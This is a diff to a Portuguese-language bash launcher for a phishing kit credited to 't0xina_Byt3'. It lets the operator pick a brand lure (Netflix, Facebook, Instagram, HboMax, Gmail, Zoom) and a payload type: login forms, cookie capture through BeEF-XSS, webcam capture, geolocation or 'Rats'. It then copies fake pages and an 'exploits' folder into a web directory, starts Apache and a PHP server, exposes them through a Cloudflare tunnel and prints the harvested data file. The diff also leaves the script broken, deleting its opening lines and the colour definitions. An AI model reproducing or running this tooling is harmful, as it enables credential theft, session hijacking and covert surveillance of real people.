@@ -1,8 +1,4 @@
-#!/bin/bash
-
-# Cores para o terminal
-RED='\033[0;31m'
-GREEN='\033[0;32m'
+REEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
@@ -10,9 +6,7 @@ NC='\033[0m' # No Color
 # Variáveis
 type_models="API/img" # Local das imagens
 type_egs="API/models"  # Local dos modelos
-apache="/var/www/html/page-fake/"  # Local do apache
-php='/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "php -S localhost:8080; exec bash"'
-cloudflare='/mnt/c/Windows/System32/cmd.exe /c start wt new-tab -- wsl bash -c "cloudflare tunnel --url localhost:8080; exec bash"'
+apache="/var/www/html/page-fake"  # Local do apache
 c="clear" # Limpar
 
 ## Criando pastas
@@ -27,6 +21,7 @@ $c
 # Função para exibir o menu principal
 show_model_menu() {
     $c
+
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|            ${GREEN}[**Escolha qual tipo de EG.S você deseja**]${NC}               ${YELLOW}|${NC}"
@@ -83,25 +78,29 @@ show_main_menu() {
     $c
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
+    echo -e "${YELLOW}|            ${GREEN}Created by t0xina_Byt3${NC}                                    ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|______________________________________________________________________|${NC}"
+    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
+    echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|                 ${GREEN}[**Escolha o tipo de modelo**]${NC}                       ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"     
-    echo -e "${YELLOW}|   1 --------------------------------->> ${GREEN}Netflix${NC}                     ${YELLOW}|${NC}"         
+    echo -e "${YELLOW}|   1 --------------------------------->> ${GREEN}Netflix${NC}                      ${YELLOW}|${NC}"         
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"                     
-    echo -e "${YELLOW}|   2 ------------------>> ${GREEN}Facebook${NC}                                   ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|   2 ------------------>> ${GREEN}Facebook${NC}                                    ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
-    echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Instagram${NC}                     ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Instagram${NC}                      ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
-    echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}HboMax${NC}                                ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}HboMax${NC}                                  ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
-    echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Gmail${NC}                                    ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Gmail${NC}                                      ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
-    echo -e "${YELLOW}|   6 ------------------->> ${GREEN}Zoom${NC}                                    ${YELLOW}|${NC}"
+    echo -e "${YELLOW}|   6 ------------------->> ${GREEN}Zoom${NC}                                       ${YELLOW}|${NC}"
     echo -e "${YELLOW}+______________________________________________________________________+${NC}"
     echo -e "${YELLOW}|                                                                      |${NC}"
     echo -e "${YELLOW}|   0 -------->> ${RED}Voltar${NC}                                                ${YELLOW}|${NC}" 
@@ -114,35 +113,43 @@ show_main_menu() {
 process_main_choice() {
     case $1 in
      1)
-            echo -e "${GREEN}Você escolheu: Netflix${NC}" 
-            cp "$type_models/1.jpg" "$apache"  > 1.jpg
+            echo -e "${GREEN}${NC}" 
+            cp "$type_models/1.jpg" "$apache"  
+            
             
             ;;
         2)
-            echo -e "${GREEN}Você escolheu: Facebook${NC}"
-            cp "$type_models/2.jpg" "$apache" > 1.jpg
+            echo -e "${GREEN}${NC}"
+            cp "$type_models/2.jpg" "$apache" 
+            mv $apache/2.jpg $apache/1.jpg
             ;;
         3)
-            echo -e "${GREEN}Você escolheu: Instagram${NC}"
-            cp  "$type_models/3.jpg" "$apache" > 1.jpg
+            echo -e "${GREEN}${NC}"
+            cp  "$type_models/3.jpg" "$apache" 
+            mv $apache/3.jpg $apache/1.jpg
             ;;
         4)
-            echo -e "${GREEN}Você escolheu: HboxMax${NC}"
-            cp "$type_models/4.jpg" "$apache" > 1.jpg
+            echo -e "${GREEN}${NC}"
+            cp "$type_models/4.jpg" "$apache" 
+            mv $apache/4.jpg $apache/1.jpg
             ;;
         5)
-            echo -e "${GREEN}Você escolheu: Gmail${NC}"
-            cp "$type_models/5.jpg" "$apache" > 1.jpg
+            echo -e "${GREEN}${NC}"
+            cp "$type_models/5.jpg" "$apache" 
+            mv $apache/5.jpg $apache/1.jpg
             ;;
         6)
-            echo -e "${GREEN}Você escolheu: Zoom${NC}"
-            cp "$type_models/6.jpg" "$apache" > 1.jpg
+            echo -e "${GREEN}${NC}"
+            cp "$type_models/6.jpg" "$apache" 
+            mv $apache/6.jpg $apache/1.jpg
             ;;
         0)
-            echo -e "${RED}Voltando ao menu principal...${NC}"
+            echo -e "${RED}Voltando ao menu principal... 
+            ${NC}"
             ;;
         *)
-            echo -e "${RED}Opção inválida! Tente novamente.${NC}"
+            echo -e "${RED}Opção inválida! Tente novamente... 
+            ${NC}"
             ;;
     esac
 }
@@ -152,22 +159,28 @@ process_model_choice() {
     case $1 in
         1)
             echo -e "${GREEN}Você escolheu: Standart${NC}"
-            cp -r "$type_egs/index.php" "$apache"
+            cp  "$type_egs/index.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
-            cp -r "$type_egs/exploits/" "$apache"
+            cp  "$type_egs/exploits/" "$apache"
             echo "[**Exploits Carregados com sucesso no apache**]"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
 
             ;;
         2)
             echo -e "${GREEN}Você escolheu: Captura de cookies Beta${NC}"
-            cp -r "$type_egs/2.php" "$apache"
+            cp  "$type_egs/2.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
+            echo "[**Iniciando Beef-xss**]"
+            systemctl start beef-xss
+            systemctl enable beef-xss.service
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -175,123 +188,161 @@ process_model_choice() {
             ;;
         3)
             echo -e "${GREEN}Você escolheu: Formulario${NC}"
-            cp -r "$type_egs/3.php" "$apache"
+            cp "$type_egs/3.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         4)
             echo -e "${GREEN}Você escolheu: Formulario + Camera${NC}"
-            cp -r "$type_egs/4.php" "$apache"
+            cp  "$type_egs/4.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Iniciando Apache2**]"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         5)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate${NC}"
             cp -r "$type_egs/5.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         6)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Camera + Rats${NC}"
-            cp -r "$type_egs/6.php" "$apache"
+            cp  "$type_egs/6.php" "$apache"
+            cp  "$type_egs/dados.txt"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         7)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Rats${NC}"
-            cp -r "$type_egs/7.php" "$apache"
-            cp -r "$type_egs/exploits/" "$apache"
+            cp  "$type_egs/7.php" "$apache"
+            cp  "$type_egs/exploits/" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"          
             echo "[**Exploits Carregados com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         8)
             echo -e "${GREEN}Você escolheu: Login${NC}"
-            cp -r "$type_egs/8.php" "$apache"
+            cp  "$type_egs/8.php" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &       
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
+
         9)
             echo -e "${GREEN}Você escolheu: Login + Geolocate${NC}"
-            cp -r "$type_egs/9.php" "$apache"
+            cp  "$type_egs/9.php" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &      
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         10)
             echo -e "${GREEN}Você escolheu: Camera com zoom ${NC}"
-            cp -r "$type_egs/10.php" "$apache"
+            cp  "$type_egs/10.php" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &  
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         11)
             echo -e "${GREEN}Você escolheu: Login + Camera + Location${NC}"
-            cp -r "$type_egs/11.php" "$apache"
+            cp  "$type_egs/11.php" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &      
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &   
+            $TERMINAL -e "bash -c 'cat dados.txt'" 
             ;;
         12)
             echo -e "${GREEN}Você escolheu: Login + Location + Rats${NC}"
-            cp -r "$type_egs/12.php" "$apache"
+            cp  "$type_egs/12.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
-            cp -r "$type_egs/exploits/" "$apache"
+            cp  "$type_egs/exploits/" "$apache"
+            cp  "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
+            systemctl start apache2
+            systemctl enable apache2.service
             echo "[**Exploits Carregados com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &       
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         13)
             echo -e "${GREEN}Você escolheu: Login + Location${NC}"
-            cp -r "$type_egs/13.php" "$apache"
+            cp  "$type_egs/13.php" "$apache"
+            cp "$type_egs/dados.txt" "$apache"
+            echo "[**Dados carregados com sucesso**]"
+            systemctl start apache2
+            systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
             echo "[**Apache carregado com sucesso**]"
-            $TERMINAL -- bash -c "php -S localhost:8080; exec bash" &
-            $TERMINAL -- bash -c "cloudflare tunnel --url localhost:8080; exec bash" &   
+            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
+            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080'" &
+            $TERMINAL -e "bash -c 'cat dados.txt'"
             ;;
         0) 
             echo -e "${RED}Saindo...${NC}"
@@ -305,7 +356,7 @@ process_model_choice() {
 
 while true; do
     show_main_menu  # Exibe o menu principal (Modelos)
-    read -p "Escolha uma opção --->>> " choice
+    read -p "Escolha uma opção --->>>  " choice
 
     if [[ $choice -eq 0 ]]; then
         echo -e "${RED}Saindo...${NC}"
@@ -323,3 +374,4 @@ while true; do
     read -p "Escolha uma opção de --->>> " egs_choice
     process_model_choice $egs_choice  # Processa a escolha no menu EG.S
 done
+                                                                                                                                                                                                                  
